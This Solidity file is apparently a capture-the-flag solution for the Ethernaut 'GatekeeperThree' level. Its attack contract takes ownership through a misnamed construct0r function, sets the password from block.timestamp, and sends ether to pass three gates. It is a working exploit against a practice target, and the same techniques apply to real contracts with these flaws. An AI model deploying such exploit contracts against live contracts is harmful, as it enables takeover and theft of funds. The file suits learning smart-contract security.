// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint256) external;
    function enter() external returns (bool);
}

contract GatekeeperThreeAttack {
    IGatekeeperThree public gatekeeperThree;
    address public owner;

    constructor(address _gatekeeperThreeAddress) {
        gatekeeperThree = IGatekeeperThree(_gatekeeperThreeAddress);
        owner = msg.sender;
    }

    function solve1() public {
        gatekeeperThree.construct0r();
    }

    function solve2() public {
        gatekeeperThree.createTrick();
        gatekeeperThree.getAllowance(block.timestamp);
    }

    function solve3() public {
        (bool success, ) = payable(address(gatekeeperThree)).call{
            value: address(this).balance
        }("");
        require(success, "Transfer failed.");
    }

    function becomeEntrant() public {
        gatekeeperThree.enter();
    }

    function attack() external {
        // Solve gateOne
        gatekeeperThree.construct0r(); // sets owner to msg.sender (this contract's address)

        // Solve gateTwo
        gatekeeperThree.createTrick();
        gatekeeperThree.getAllowance(block.timestamp); // sets allowEntrance to true

        // Solve gateThree
        // transfer the entire balance of the contract to gatekeeperThree 
        (bool success, ) = payable(address(gatekeeperThree)).call{
            value: address(this).balance
        }("");
        require(success, "Transfer failed.");

        // Become an entrant
        gatekeeperThree.enter();
    }
}
